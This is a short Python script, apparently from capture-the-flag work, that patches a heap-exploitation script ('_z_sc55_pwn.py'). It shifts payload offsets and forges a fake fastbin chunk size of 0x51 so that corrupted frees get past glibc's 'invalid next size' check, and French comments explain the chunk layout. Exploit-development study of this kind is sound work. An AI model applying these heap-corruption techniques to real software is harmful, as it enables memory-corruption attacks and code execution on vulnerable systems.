p=r"./_z_55\_z_sc55_pwn.py"
s=open(p,encoding="utf-8").read()
# (1) p doit etre le USER du faux chunk dont la taille S est en p-8 = heap+0x138
s=s.replace("            pay = [FAKE_FAST, 0, FAKE_FAST, heap + 0x130, 0x602050, 0x602080, 0, 0, 0, 0, 0]",
            "            pay = [FAKE_FAST, 0, FAKE_FAST, heap + 0x140, 0x602050, 0x602080, 0, 0, 0, 0, 0]")
s=s.replace("    p_addr = heap + 0x130","    p_addr = heap + 0x140")
# (2) chunk #76 : son user+8 = p+S+8 doit ressembler a une taille (0x51)
old="        buy(0x48, bytes(pay0) if made == 0 else b'C' * 0x48)"
new=("        if made == 0:\n            data = bytes(pay0)\n        elif made == 76:\n"
     "            # chunk #76 : user 0x18f0, +8 = p+S+8 -> doit valoir 0x51 pour\n"
     "            # passer le controle `free(): invalid next size (fast)`\n"
     "            data = p64(0) + p64(0x51) + b'C' * 0x38\n        else:\n            data = b'C' * 0x48\n"
     "        buy(0x48, data)")
assert old in s
s=s.replace(old,new)
open(p,"w",encoding="utf-8").write(s)
print("patched")
